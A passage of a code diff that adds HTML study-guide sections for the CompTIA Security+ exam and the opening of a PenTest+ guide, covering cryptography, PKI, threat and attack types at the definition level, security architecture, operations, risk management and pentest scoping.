+<td>Operational</td>
+<td>Training, background checks, change management</td>
+</tr>
+<tr>
+<td>Physical</td>
+<td>Locks, bollards, mantrap, fencing, cameras</td>
+</tr>
+</tbody>
+</table>
+<h3>CIA Triad</h3>
+<ul>
+<li><strong>Confidentiality:</strong> Data accessible only to authorized users. Controls: encryption, access control, MFA</li>
+<li><strong>Integrity:</strong> Data is accurate and hasn't been modified. Controls: hashing, digital signatures, checksums</li>
+<li><strong>Availability:</strong> Systems accessible when needed. Controls: redundancy, backups, DDoS protection</li>
+</ul>
+<p><strong>Extended model:</strong></p>
+<ul>
+<li><strong>Non-repudiation:</strong> Cannot deny performing an action (digital signatures, audit logs)</li>
+<li><strong>Authentication:</strong> Proving identity</li>
+<li><strong>Authorization:</strong> Granting access</li>
+</ul>
+<h3>Cryptography Concepts</h3>
+<p><strong>Symmetric Encryption (same key):</strong></p>
+<ul>
+<li>Fast, efficient for bulk data</li>
+<li>Key distribution is a challenge</li>
+<li>Examples: <strong>AES</strong> (128/192/256-bit), 3DES, DES (broken), Blowfish, RC4 (avoid)</li>
+</ul>
+<p><strong>Asymmetric Encryption (key pair):</strong></p>
+<ul>
+<li>Public key: Anyone can use to encrypt</li>
+<li>Private key: Only owner uses to decrypt</li>
+<li>Slower than symmetric</li>
+<li>Examples: <strong>RSA</strong> (2048/4096-bit), ECC (Elliptic Curve — smaller keys, same strength), DSA, Diffie-Hellman</li>
+</ul>
+<p><strong>Hybrid Encryption:</strong></p>
+<ul>
+<li>Use asymmetric to exchange a symmetric key</li>
+<li>Then use symmetric for bulk data encryption</li>
+<li>How HTTPS/TLS works!</li>
+</ul>
+<p><strong>Hashing (one-way, no decryption):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Algorithm</th>
+<th>Output Size</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MD5</td>
+<td>128-bit</td>
+<td>Broken — don't use</td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td>160-bit</td>
+<td>Weak — avoid</td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td>256-bit</td>
+<td>Strong — use this</td>
+</tr>
+<tr>
+<td>SHA-3</td>
+<td>Variable</td>
+<td>Strongest</td>
+</tr>
+<tr>
+<td>bcrypt</td>
+<td>Variable</td>
+<td>Best for passwords</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Key concepts:</strong></p>
+<ul>
+<li><strong>Salt:</strong> Random data added to password before hashing (prevents rainbow tables)</li>
+<li><strong>Rainbow table:</strong> Precomputed hash table for cracking passwords</li>
+<li><strong>Key stretching:</strong> Artificially slow hashing (PBKDF2, bcrypt, Argon2)</li>
+<li><strong>Collision resistance:</strong> Two different inputs can't produce same hash</li>
+<li><strong>Avalanche effect:</strong> Small input change → dramatically different hash</li>
+</ul>
+<h3>Digital Certificates and PKI</h3>
+<p><strong>PKI (Public Key Infrastructure):</strong> System for managing digital certificates</p>
+<p><strong>Certificate Authority (CA):</strong> Trusted third party that issues certificates</p>
+<ul>
+<li><strong>Root CA:</strong> Top of the chain; highest trust</li>
+<li><strong>Intermediate CA:</strong> Issued by Root CA; issues end-entity certs</li>
+<li><strong>End-entity cert:</strong> For websites, users, code signing</li>
+</ul>
+<p><strong>Certificate contents:</strong></p>
+<ul>
+<li>Subject (owner)</li>
+<li>Public key</li>
+<li>Issuer (CA name)</li>
+<li>Validity period (not before / not after)</li>
+<li>Serial number</li>
+<li>Digital signature of CA</li>
+<li>Subject Alternative Names (SANs)</li>
+</ul>
+<p><strong>Certificate types:</strong></p>
+<ul>
+<li><strong>DV (Domain Validated):</strong> Only domain ownership verified</li>
+<li><strong>OV (Organization Validated):</strong> Organization identity verified</li>
+<li><strong>EV (Extended Validation):</strong> Strict vetting; green bar (old) browsers</li>
+<li><strong>Wildcard:</strong> *.example.com — all subdomains</li>
+<li><strong>SAN cert:</strong> Multiple domains on one cert</li>
+</ul>
+<p><strong>Trust chain:</strong> Root CA → Intermediate CA → End-entity cert<br/><strong>CRL (Certificate Revocation List):</strong> Published list of revoked certs<br/><strong>OCSP:</strong> Online Certificate Status Protocol — real-time revocation check</p>
+<p><strong>Common certificate formats:</strong></p>
+<ul>
+<li><strong>.pem / .crt / .cer:</strong> Base64-encoded (text)</li>
+<li><strong>.der:</strong> Binary-encoded</li>
+<li><strong>.pfx / .p12:</strong> Contains cert + private key (PKCS#12)</li>
+<li><strong>.csr:</strong> Certificate Signing Request</li>
+</ul>
+
+`,
+  "study-guide-securityplus-03": `
+<h2>3. Domain 2: Threats, Vulnerabilities, and Mitigations</h2>
+<h3>Threat Actors</h3>
+<table>
+<thead>
+<tr>
+<th>Actor</th>
+<th>Motivation</th>
+<th>Resources</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nation-State (APT)</td>
+<td>Espionage, sabotage</td>
+<td>Highest (gov't funded)</td>
+<td>Lazarus Group, APT29</td>
+</tr>
+<tr>
+<td>Cybercriminals</td>
+<td>Financial</td>
+<td>High</td>
+<td>Ransomware gangs</td>
+</tr>
+<tr>
+<td>Hacktivists</td>
+<td>Political/ideological</td>
+<td>Medium</td>
+<td>Anonymous</td>
+</tr>
+<tr>
+<td>Script Kiddies</td>
+<td>Fun, notoriety</td>
+<td>Low</td>
+<td>Unskilled attackers</td>
+</tr>
+<tr>
+<td>Insider Threats</td>
+<td>Various</td>
+<td>High (access)</td>
+<td>Disgruntled employees</td>
+</tr>
+<tr>
+<td>Competitors</td>
+<td>Corporate espionage</td>
+<td>Medium-high</td>
+</tr>
+</tbody>
+</table>
+<p><strong>APT (Advanced Persistent Threat):</strong> Long-term, stealthy attack; usually nation-state</p>
+<h3>Attack Types</h3>
+<p><strong>Social Engineering:</strong></p>
+<ul>
+<li><strong>Phishing:</strong> Mass email to steal credentials/data</li>
+<li><strong>Spear phishing:</strong> Targeted, personalized phishing</li>
+<li><strong>Whaling:</strong> Phishing targeting executives</li>
+<li><strong>Vishing:</strong> Voice/phone phishing</li>
+<li><strong>Smishing:</strong> SMS phishing</li>
+<li><strong>Pretexting:</strong> Creating false scenario to extract info</li>
+<li><strong>Baiting:</strong> Physical media (USB drops) or online lures</li>
+<li><strong>Tailgating/Piggybacking:</strong> Following authorized person through secure door</li>
+<li><strong>Watering hole:</strong> Compromise website victims frequently visit</li>
+<li><strong>Business Email Compromise (BEC):</strong> Fake executive emails to trick payments</li>
+</ul>
+<p><strong>Malware Types:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Behavior</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Virus</td>
+<td>Self-replicates by infecting files; needs host</td>
+</tr>
+<tr>
+<td>Worm</td>
+<td>Self-replicates over network; no host needed</td>
+</tr>
+<tr>
+<td>Trojan</td>
+<td>Disguised as legitimate software</td>
+</tr>
+<tr>
+<td>Ransomware</td>
+<td>Encrypts files, demands payment</td>
+</tr>
+<tr>
+<td>Spyware</td>
+<td>Secretly monitors and transmits user activity</td>
+</tr>
+<tr>
+<td>Adware</td>
+<td>Displays unwanted advertisements</td>
+</tr>
+<tr>
+<td>Rootkit</td>
+<td>Hides deeply in OS, grants persistent access</td>
+</tr>
+<tr>
+<td>Keylogger</td>
+<td>Records keystrokes</td>
+</tr>
+<tr>
+<td>Botnet</td>
+<td>Network of compromised machines (zombies)</td>
+</tr>
+<tr>
+<td>Logic bomb</td>
+<td>Triggers on condition (date, action)</td>
+</tr>
+<tr>
+<td>Fileless malware</td>
+<td>Lives in memory, no disk file</td>
+</tr>
+<tr>
+<td>RAT</td>
+<td>Remote Access Trojan — full remote control</td>
+</tr>
+<tr>
+<td>PUA</td>
+<td>Potentially Unwanted Application</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Network Attacks:</strong></p>
+<ul>
+<li><strong>DDoS:</strong> Distributed Denial of Service — flood with traffic<ul>
+<li><strong>Volumetric:</strong> UDP flood, ICMP flood, DNS amplification</li>
+<li><strong>Protocol:</strong> SYN flood, Ping of Death, Smurf</li>
+<li><strong>Application layer:</strong> HTTP flood, Slowloris</li>
+</ul>
+</li>
+<li><strong>Man-in-the-Middle (MITM):</strong> Intercept/alter communications</li>
+<li><strong>ARP Poisoning:</strong> Fake ARP replies to redirect traffic</li>
+<li><strong>DNS Poisoning/Spoofing:</strong> Corrupt DNS cache with false records</li>
+<li><strong>IP Spoofing:</strong> Forge source IP address</li>
+<li><strong>Session Hijacking:</strong> Steal authenticated session token</li>
+<li><strong>Replay Attack:</strong> Capture and retransmit valid authentication</li>
+<li><strong>Downgrade Attack:</strong> Force use of weaker protocol (SSL vs TLS)</li>
+</ul>
+<p><strong>Injection Attacks:</strong></p>
+<ul>
+<li><strong>SQL Injection:</strong> Malicious SQL in input → database manipulation</li>
+<li><strong>XSS (Cross-Site Scripting):</strong> Inject malicious scripts into web pages</li>
+<li><strong>LDAP Injection:</strong> Malicious LDAP query</li>
+<li><strong>Command Injection:</strong> OS commands via vulnerable input</li>
+<li><strong>XML/XXE Injection:</strong> XML external entity attack</li>
+<li><strong>Buffer Overflow:</strong> Exceed buffer bounds → execute code</li>
+</ul>
+<p><strong>Password Attacks:</strong></p>
+<ul>
+<li><strong>Brute force:</strong> Try every combination</li>
+<li><strong>Dictionary:</strong> Try common words/passwords</li>
+<li><strong>Credential stuffing:</strong> Try leaked credentials from other breaches</li>
+<li><strong>Password spraying:</strong> One common password tried against many accounts</li>
+<li><strong>Rainbow table:</strong> Precomputed hash database</li>
+</ul>
+<p><strong>Wireless Attacks:</strong></p>
+<ul>
+<li><strong>Evil twin:</strong> Rogue AP mimicking legitimate one</li>
+<li><strong>Deauthentication (deauth):</strong> Force clients to disconnect</li>
+<li><strong>KRACK:</strong> Key Reinstallation Attack on WPA2</li>
+<li><strong>Rogue AP:</strong> Unauthorized access point</li>
+<li><strong>Wardriving:</strong> Driving around scanning for wireless networks</li>
+</ul>
+<h3>Vulnerabilities</h3>
+<ul>
+<li><strong>CVE:</strong> Common Vulnerabilities and Exposures — standard ID for vulnerabilities</li>
+<li><strong>CVSS:</strong> Common Vulnerability Scoring System — severity score 0–10<ul>
+<li>Critical: 9.0–10.0 | High: 7.0–8.9 | Medium: 4.0–6.9 | Low: 0.1–3.9</li>
+</ul>
+</li>
+<li><strong>Zero-day:</strong> Vulnerability unknown to vendor; no patch available</li>
+<li><strong>Exploit:</strong> Code or technique that takes advantage of a vulnerability</li>
+</ul>
+<p><strong>Types of vulnerabilities:</strong></p>
+<ul>
+<li>Misconfiguration (default passwords, open ports)</li>
+<li>Weak/outdated encryption</li>
+<li>SQL injection, XSS in code</li>
+<li>Race conditions</li>
+<li>Integer overflow</li>
+<li>Improper input validation</li>
+<li>Default credentials</li>
+<li>Supply chain (compromised third-party software)</li>
+</ul>
+<p><strong>OWASP Top 10 (Web App):</strong></p>
+<ol>
+<li>Broken Access Control</li>
+<li>Cryptographic Failures</li>
+<li>Injection (SQL, LDAP, etc.)</li>
+<li>Insecure Design</li>
+<li>Security Misconfiguration</li>
+<li>Vulnerable and Outdated Components</li>
+<li>Identification and Authentication Failures</li>
+<li>Software and Data Integrity Failures</li>
+<li>Security Logging and Monitoring Failures</li>
+<li>Server-Side Request Forgery (SSRF)</li>
+</ol>
+
+`,
+  "study-guide-securityplus-04": `
+<h2>4. Domain 3: Security Architecture</h2>
+<h3>Network Segmentation</h3>
+<ul>
+<li><strong>VLAN:</strong> Logical network separation at Layer 2</li>
+<li><strong>Subnet:</strong> IP-level segmentation</li>
+<li><strong>DMZ (Demilitarized Zone):</strong> Network for public-facing servers; between two firewalls</li>
+<li><strong>Screened subnet:</strong> Modern term for DMZ</li>
+<li><strong>Micro-segmentation:</strong> Fine-grained segmentation within data center (SDN/zero trust)</li>
+<li><strong>Air gap:</strong> Physical isolation (no network connection)</li>
+</ul>
+<h3>Zero Trust Architecture</h3>
+<p>Core principle: <strong>Never trust, always verify.</strong> No implicit trust inside or outside the network.</p>
+<p><strong>Key concepts:</strong></p>
+<ul>
+<li><strong>Verify explicitly:</strong> Always authenticate and authorize (MFA, contextual)</li>
+<li><strong>Least privilege:</strong> Minimum access needed</li>
+<li><strong>Assume breach:</strong> Design as if attacker is already inside</li>
+</ul>
+<p><strong>Components:</strong></p>
+<ul>
+<li><strong>Identity:</strong> Strong MFA for all users</li>
+<li><strong>Device health:</strong> Verify device posture before access</li>
+<li><strong>Network:</strong> Micro-segmentation, east-west traffic inspection</li>
+<li><strong>Application:</strong> App-level access policies</li>
+<li><strong>Data:</strong> Classify and protect data</li>
+</ul>
+<h3>Cloud Security</h3>
+<p><strong>Cloud Shared Responsibility Model:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Responsibility</th>
+<th>IaaS</th>
+<th>PaaS</th>
+<th>SaaS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Data</td>
+<td>Customer</td>
+<td>Customer</td>
+<td>Customer</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>Customer</td>
+<td>Customer</td>
+<td>Provider</td>
+</tr>
+<tr>
+<td>Runtime</td>
+<td>Customer</td>
+<td>Provider</td>
+<td>Provider</td>
+</tr>
+<tr>
+<td>Middleware</td>
+<td>Customer</td>
+<td>Provider</td>
+<td>Provider</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Customer</td>
+<td>Provider</td>
+<td>Provider</td>
+</tr>
+<tr>
+<td>Virtualization</td>
+<td>Provider</td>
+<td>Provider</td>
+<td>Provider</td>
+</tr>
+<tr>
+<td>Storage</td>
+<td>Provider</td>
+<td>Provider</td>
+<td>Provider</td>
+</tr>
+<tr>
+<td>Network</td>
+<td>Provider</td>
+<td>Provider</td>
+<td>Provider</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Cloud security controls:</strong></p>
+<ul>
+<li><strong>CASB (Cloud Access Security Broker):</strong> Security policy enforcement between cloud and users</li>
+<li><strong>CSPM (Cloud Security Posture Management):</strong> Detect misconfiguration</li>
+<li><strong>SWG (Secure Web Gateway):</strong> Filter web traffic</li>
+<li><strong>FWaaS (Firewall as a Service):</strong> Cloud-based firewall</li>
+</ul>
+<h3>Security Zones and Architectures</h3>
+<p><strong>Network zones:</strong></p>
+<ul>
+<li>Internet (untrusted)</li>
+<li>DMZ (semi-trusted)</li>
+<li>Internal LAN (trusted)</li>
+<li>Management VLAN (highly trusted)</li>
+</ul>
+<p><strong>Infrastructure security:</strong></p>
+<ul>
+<li><strong>SASE (Secure Access Service Edge):</strong> Cloud-delivered security (SD-WAN + SSE)</li>
+<li><strong>SSE (Security Service Edge):</strong> CASB + SWG + ZTNA</li>
+<li><strong>ZTNA (Zero Trust Network Access):</strong> Replace VPN with zero trust</li>
+</ul>
+<h3>Secure Communications</h3>
+<p><strong>Email security:</strong></p>
+<ul>
+<li><strong>SPF:</strong> Sender Policy Framework — authorized mail servers</li>
+<li><strong>DKIM:</strong> DomainKeys Identified Mail — digital signature on emails</li>
+<li><strong>DMARC:</strong> Domain-based Message Authentication — policy for SPF/DKIM failures</li>
+</ul>
+<p><strong>Secure protocols:</strong></p>
+<ul>
+<li>HTTPS (HTTP + TLS) — port 443</li>
+<li>FTPS (FTP + TLS) — port 990</li>
+<li>SFTP (SSH File Transfer Protocol) — port 22</li>
+<li>SSH — port 22</li>
+<li>LDAPS — port 636</li>
+<li>IMAPS — port 993</li>
+<li>POP3S — port 995</li>
+<li>SMTPS — port 465/587</li>
+<li>DNSSEC — DNS integrity via signatures</li>
+<li>SNMPv3 — encrypted SNMP</li>
+</ul>
+<p><strong>VPN Protocols:</strong></p>
+<ul>
+<li><strong>IPsec:</strong> Network-layer; ESP + AH; tunnel or transport mode</li>
+<li><strong>OpenVPN:</strong> Open source, TLS-based</li>
+<li><strong>WireGuard:</strong> Modern, fast, simple</li>
+<li><strong>SSL/TLS VPN:</strong> Browser-based or client; port 443</li>
+<li><strong>L2TP/IPsec:</strong> Layer 2 tunneling + IPsec encryption</li>
+</ul>
+
+`,
+  "study-guide-securityplus-05": `
+<h2>5. Domain 4: Security Operations</h2>
+<h3>Identity and Access Management (IAM)</h3>
+<p><strong>Authentication factors:</strong></p>
+<ul>
+<li>Knowledge: Password, PIN, security questions</li>
+<li>Possession: Smart card, token, phone</li>
+<li>Inherence: Biometrics (fingerprint, face, iris, voice)</li>
+<li>Location: GPS, IP-based</li>
+</ul>
+<p><strong>MFA methods:</strong></p>
+<ul>
+<li><strong>TOTP:</strong> Time-based One-Time Password (Google Authenticator)</li>
+<li><strong>HOTP:</strong> HMAC-based OTP (counter-based)</li>
+<li><strong>Push notification:</strong> Approve on phone</li>
+<li><strong>Hardware token:</strong> RSA SecurID, YubiKey</li>
+<li><strong>SMS/Email OTP:</strong> Weakest (SIM swapping risk)</li>
+</ul>
+<p><strong>Password best practices:</strong></p>
+<ul>
+<li>Length over complexity (12+ characters)</li>
+<li>Unique per site/service</li>
+<li>Password manager</li>
+<li>Don't reuse</li>
+<li>Enable MFA</li>
+</ul>
+<p><strong>SSO (Single Sign-On):</strong> One authentication for multiple systems
+<strong>SAML:</strong> XML-based SSO federation (web apps)
+<strong>OAuth 2.0:</strong> Authorization framework (third-party app access)
+<strong>OpenID Connect:</strong> Authentication layer on top of OAuth 2.0
+<strong>LDAP:</strong> Directory authentication (Active Directory)
+<strong>Kerberos:</strong> Ticket-based authentication (Windows AD)</p>
+<p><strong>Privilege Management:</strong></p>
+<ul>
+<li><strong>PAM (Privileged Access Management):</strong> Control and audit elevated access</li>
+<li><strong>Just-in-time (JIT):</strong> Grant access only when needed</li>
+<li><strong>RBAC:</strong> Role-Based Access Control — roles define permissions</li>
+<li><strong>DAC:</strong> Discretionary Access Control — owner controls</li>
+<li><strong>MAC:</strong> Mandatory Access Control — policy defines (military)</li>
+<li><strong>ABAC:</strong> Attribute-Based Access Control — fine-grained attributes</li>
+</ul>
+<h3>Security Monitoring</h3>
+<p><strong>SIEM (Security Information and Event Management):</strong></p>
+<ul>
+<li>Collects and correlates logs from all sources</li>
+<li>Alerts on suspicious activity</li>
+<li>Examples: Splunk, IBM QRadar, Microsoft Sentinel</li>
+</ul>
+<p><strong>Log sources:</strong></p>
+<ul>
+<li>Firewalls, IDS/IPS, web proxies</li>
+<li>Windows Event Log, syslog</li>
+<li>DNS, DHCP, VPN logs</li>
+<li>Endpoint security (AV/EDR)</li>
+<li>Cloud access logs</li>
+</ul>
+<p><strong>SOC (Security Operations Center):</strong></p>
+<ul>
+<li>Team monitoring security 24/7</li>
+<li>L1: Alert triage | L2: Investigation | L3: Threat hunting | L4: IR management</li>
+</ul>
+<p><strong>Threat hunting:</strong> Proactively search for attackers (not waiting for alerts)
+<strong>UEBA:</strong> User and Entity Behavior Analytics — detect anomalous behavior</p>
+<h3>Vulnerability Management</h3>
+<ol>
+<li><strong>Discovery:</strong> Scan network for assets</li>
+<li><strong>Scanning:</strong> Find vulnerabilities (Nessus, OpenVAS, Qualys)</li>
+<li><strong>Analysis:</strong> Assess severity (CVSS) and exploitability</li>
+<li><strong>Remediation:</strong> Patch, mitigate, or accept risk</li>
+<li><strong>Verification:</strong> Confirm fix worked</li>
+<li><strong>Reporting:</strong> Document findings and trends</li>
+</ol>
+<p><strong>Scanning types:</strong></p>
+<ul>
+<li><strong>Credentialed scan:</strong> Scanner has account access → more thorough</li>
+<li><strong>Non-credentialed:</strong> External view → misses internal issues</li>
+<li><strong>External scan:</strong> From outside the network</li>
+<li><strong>Internal scan:</strong> From inside the network</li>
+<li><strong>Agent-based:</strong> Software on endpoint reports back</li>
+</ul>
+<p><strong>Patch management:</strong></p>
+<ul>
+<li><strong>Hotfix:</strong> Emergency fix for single issue</li>
+<li><strong>Patch:</strong> Fix for specific vulnerability</li>
+<li><strong>Update:</strong> Non-security enhancement</li>
+<li><strong>Upgrade:</strong> Major version change</li>
+</ul>
+<h3>Endpoint Security</h3>
+<p><strong>EDR (Endpoint Detection and Response):</strong> Advanced endpoint security with behavioral detection, response capabilities
+<strong>XDR (Extended Detection and Response):</strong> Correlates across endpoints, network, cloud
+<strong>DLP (Data Loss Prevention):</strong> Prevent unauthorized data exfiltration</p>
+<p><strong>Hardening endpoints:</strong></p>
+<ul>
+<li>Remove unnecessary software</li>
+<li>Disable unneeded services</li>
+<li>Apply CIS benchmarks</li>
+<li>Enable host-based firewall</li>
+<li>Enable disk encryption (BitLocker, FileVault)</li>
+<li>Configure application whitelisting</li>
+</ul>
+<h3>Incident Response</h3>
+<p><strong>NIST IR Framework phases:</strong></p>
+<ol>
+<li><strong>Preparation</strong> — Policies, tools, training, IR team</li>
+<li><strong>Detection and Analysis</strong> — Identify and confirm incident</li>
+<li><strong>Containment</strong> — Stop the spread (short-term and long-term)</li>
+<li><strong>Eradication</strong> — Remove root cause (malware, unauthorized accounts)</li>
+<li><strong>Recovery</strong> — Restore systems to normal</li>
+<li><strong>Post-Incident Activity</strong> — Lessons learned, documentation</li>
+</ol>
+<p><strong>Chain of Custody:</strong> Document evidence handling — who accessed, when, where<br/><strong>Order of Volatility:</strong> Preserve most volatile first:</p>
+<ol>
+<li>CPU registers/cache</li>
+<li>RAM</li>
+<li>Swap/temp files</li>
+<li>Hard drive</li>
+<li>Remote logs</li>
+<li>Archived media</li>
+</ol>
+<p><strong>Digital forensics tools:</strong></p>
+<ul>
+<li><strong>dd/FTK Imager:</strong> Disk imaging (bit-for-bit copy)</li>
+<li><strong>Autopsy/FTK:</strong> Disk analysis</li>
+<li><strong>Volatility:</strong> Memory forensics</li>
+<li><strong>Wireshark:</strong> Packet capture</li>
+<li><strong>SIEM:</strong> Log analysis</li>
+</ul>
+
+`,
+  "study-guide-securityplus-06": `
+<h2>6. Domain 5: Security Program Management</h2>
+<h3>Risk Management</h3>
+<p><strong>Key concepts:</strong></p>
+<ul>
+<li><strong>Asset:</strong> Something of value (data, hardware, systems)</li>
+<li><strong>Threat:</strong> Potential event that could cause harm</li>
+<li><strong>Vulnerability:</strong> Weakness that could be exploited</li>
+<li><strong>Risk:</strong> Likelihood × Impact</li>
+<li><strong>Exploit:</strong> Take advantage of a vulnerability</li>
+<li><strong>Exposure:</strong> Vulnerability without mitigation</li>
+</ul>
+<p><strong>Risk calculation:</strong></p>
+<ul>
+<li><strong>SLE (Single Loss Expectancy):</strong> Asset value × Exposure factor</li>
+<li><strong>ARO (Annualized Rate of Occurrence):</strong> How often per year</li>
+<li><strong>ALE (Annualized Loss Expectancy):</strong> SLE × ARO</li>
+</ul>
+<p><strong>Risk treatment options:</strong></p>
+<ul>
+<li><strong>Accept:</strong> Live with the risk (document it)</li>
+<li><strong>Avoid:</strong> Stop the risky activity</li>
+<li><strong>Transfer:</strong> Share risk with others (insurance, contracts)</li>
+<li><strong>Mitigate:</strong> Reduce likelihood or impact</li>
+</ul>
+<p><strong>Risk types:</strong></p>
+<ul>
+<li>Inherent risk: Before controls</li>
+<li>Residual risk: After controls</li>
+<li>Risk appetite: How much risk is acceptable</li>
+</ul>
+<h3>Security Policies and Frameworks</h3>
+<p><strong>Common frameworks:</strong></p>
+<ul>
+<li><strong>NIST CSF:</strong> Identify, Protect, Detect, Respond, Recover</li>
+<li><strong>NIST SP 800-53:</strong> Security controls for federal systems</li>
+<li><strong>ISO 27001:</strong> ISMS standard</li>
+<li><strong>CIS Controls:</strong> Prioritized security actions</li>
+<li><strong>SOC 2:</strong> Cloud service provider security audits</li>
+<li><strong>PCI DSS:</strong> Payment card industry security</li>
+<li><strong>HIPAA:</strong> Healthcare data privacy</li>
+<li><strong>GDPR:</strong> EU data privacy regulation</li>
+</ul>
+<p><strong>Key policies:</strong></p>
+<ul>
+<li><strong>AUP (Acceptable Use Policy):</strong> Allowed uses of IT resources</li>
+<li><strong>Password policy:</strong> Complexity, length, rotation</li>
+<li><strong>BYOD policy:</strong> Personal devices on corporate network</li>
+<li><strong>Change management:</strong> Control changes to systems</li>
+<li><strong>Data classification policy:</strong> Public, Internal, Confidential, Restricted</li>
+</ul>
+<p><strong>Data classification:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Level</th>
+<th>Description</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Public</td>
+<td>Safe to share</td>
+<td>Marketing materials</td>
+</tr>
+<tr>
+<td>Internal</td>
+<td>Employees only</td>
+<td>Internal memos</td>
+</tr>
+<tr>
+<td>Confidential</td>
+<td>Need-to-know</td>
+<td>Financial data</td>
+</tr>
+<tr>
+<td>Restricted/Secret</td>
+<td>Highly sensitive</td>
+<td>Trade secrets</td>
+</tr>
+</tbody>
+</table>
+<h3>Compliance and Audits</h3>
+<p><strong>Regulations:</strong></p>
+<ul>
+<li><strong>HIPAA:</strong> Health Insurance Portability and Accountability Act — healthcare</li>
+<li><strong>PCI DSS:</strong> Payment Card Industry Data Security Standard — credit cards</li>
+<li><strong>GDPR:</strong> EU General Data Protection Regulation — personal data</li>
+<li><strong>CCPA:</strong> California Consumer Privacy Act</li>
+<li><strong>SOX:</strong> Sarbanes-Oxley — financial records</li>
+<li><strong>FERPA:</strong> Educational records (US)</li>
+</ul>
+<p><strong>Audit types:</strong></p>
+<ul>
+<li><strong>Internal:</strong> Self-assessment</li>
+<li><strong>External:</strong> Third-party assessment</li>
+<li><strong>Penetration test:</strong> Simulate real attacks</li>
+<li><strong>Vulnerability assessment:</strong> Find weaknesses (no exploitation)</li>
+<li><strong>Compliance audit:</strong> Verify regulatory adherence</li>
+</ul>
+<h3>Business Continuity and Disaster Recovery</h3>
+<p><strong>BCP (Business Continuity Plan):</strong> Keep business running during/after disaster<br/><strong>DRP (Disaster Recovery Plan):</strong> Restore IT after disaster</p>
+<p><strong>Key metrics:</strong></p>
+<ul>
+<li><strong>RPO (Recovery Point Objective):</strong> Max data loss (how old can backup be?)</li>
+<li><strong>RTO (Recovery Time Objective):</strong> Max downtime before recovery (how fast to recover?)</li>
+<li><strong>MTTR (Mean Time to Repair):</strong> Average time to fix</li>
+<li><strong>MTBF (Mean Time Between Failures):</strong> Average time between failures</li>
+</ul>
+<p><strong>Backup strategies:</strong></p>
+<ul>
+<li><strong>Full:</strong> Everything; slowest backup, fastest recovery</li>
+<li><strong>Incremental:</strong> Changes since last backup; fastest backup, slowest recovery</li>
+<li><strong>Differential:</strong> Changes since last full backup; medium both</li>
+<li><strong>3-2-1 rule:</strong> 3 copies, 2 media types, 1 offsite</li>
+</ul>
+<p><strong>Recovery sites:</strong></p>
+<ul>
+<li><strong>Hot site:</strong> Fully operational, ready immediately (expensive)</li>
+<li><strong>Warm site:</strong> Partially equipped, hours to operational (moderate cost)</li>
+<li><strong>Cold site:</strong> Space only, days/weeks to operational (cheap)</li>
+</ul>
+
+`,
+  "study-guide-securityplus-07": `
+<h2>7. Security+ Quick Reference</h2>
+<p><strong>CIA Triad:</strong> Confidentiality, Integrity, Availability<br/><strong>AAA:</strong> Authentication, Authorization, Accounting<br/><strong>Control types:</strong> Preventive, Detective, Corrective, Deterrent, Compensating, Directive<br/><strong>Control categories:</strong> Technical, Managerial, Operational, Physical<br/><strong>Risk = Likelihood × Impact</strong><br/><strong>ALE = SLE × ARO</strong><br/><strong>Zero Trust: Never trust, always verify</strong><br/><strong>MFA factors:</strong> Something you know/have/are/somewhere you are<br/><strong>OWASP Top 1:</strong> Broken Access Control<br/><strong>Encryption: Symmetric (AES) = fast bulk | Asymmetric (RSA/ECC) = key exchange</strong><br/><strong>Hashing: SHA-256 (integrity) | bcrypt (passwords)</strong><br/><strong>IR phases:</strong> Prepare → Detect → Contain → Eradicate → Recover → Lessons learned<br/><strong>RPO = data loss tolerance | RTO = downtime tolerance</strong><br/><strong>Backups: Full (all), Incremental (since last backup), Differential (since last full)</strong></p>
+
+<p><em>End of CompTIA Security+ Study Guide</em></p>
+
+`,
+  "study-guide-pentestplus-01": `
+<h2>1. Exam Overview</h2>
+<p><strong>Exam Code:</strong> PT0-003<br/><strong>Questions:</strong> Maximum 90 (multiple-choice + performance-based)<br/><strong>Time Limit:</strong> 165 minutes<br/><strong>Passing Score:</strong> 750 (on a 100–900 scale)<br/><strong>Recommended Experience:</strong> Network+, Security+, and 3–4 years hands-on security experience</p>
+<h3>Domain Breakdown</h3>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Weight</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. Engagement Management</td>
+<td>17%</td>
+</tr>
+<tr>
+<td>2. Reconnaissance and Enumeration</td>
+<td>20%</td>
+</tr>
+<tr>
+<td>3. Vulnerability Discovery and Analysis</td>
+<td>18%</td>
+</tr>
+<tr>
+<td>4. Attacks and Exploits</td>
+<td>25%</td>
+</tr>
+<tr>
+<td>5. Reporting and Communication</td>
+<td>12%</td>
+</tr>
+<tr>
+<td>6. Tools and Code Analysis</td>
+<td>8%</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-pentestplus-02": `
+<h2>2. Domain 1: Engagement Management</h2>
+<h3>Penetration Testing Types</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Black Box</strong></td>
+<td>Tester has no prior knowledge (simulates external attacker)</td>
+</tr>
+<tr>
+<td><strong>White Box</strong></td>
+<td>Full knowledge of environment (code, architecture, credentials)</td>
+</tr>
+<tr>
+<td><strong>Gray Box</strong></td>
+<td>Partial knowledge (credentials but no source code)</td>
+</tr>
+</tbody>
+</table>
+<h3>Engagement Scoping</h3>
+<p><strong>Rules of Engagement (RoE):</strong> Formal agreement defining what is and isn't allowed during a pentest.</p>
+<p><strong>Key scoping elements:</strong></p>
+<ul>
+<li>Target IP ranges, domains, applications</li>
+<li>Out-of-scope systems (explicitly excluded)</li>
+<li>Authorized testing windows (time of day)</li>
